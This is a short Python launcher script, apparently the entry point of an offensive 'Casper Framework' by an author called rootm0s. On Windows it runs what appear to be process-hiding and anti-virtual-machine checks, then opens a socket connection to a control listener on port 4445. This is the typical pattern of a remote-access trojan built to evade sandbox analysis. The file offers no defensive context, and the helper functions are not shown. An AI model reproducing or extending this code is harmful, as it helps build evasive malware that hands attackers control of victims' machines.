"""
Part of Casper Framework
"""
from framework.imports import *

logging.basicConfig(format="%(message)s",level=logging.DEBUG)

__author__ = "rootm0s"
__version__ = "0.1"

def main():
	try:
		if (sys.platform.lower().find("win") == 0):
			if (hidden(1) == True):
				if (antivm(1) == True):
					socket_control("127.0.0.1",4445,1048576)
				else:
					sys.exit()
			else:
				sys.exit()
		elif (sys.platform.lower().find("posix") == 0):
			sys.exit()
		elif (sys.platform.lower().find("dar") == 0):
			sys.exit()
		elif (sys.platform.lower().find("lin") == 0):
			sys.exit()
	except Exception as e:
		sys.exit()

if __name__ == "__main__":
	main()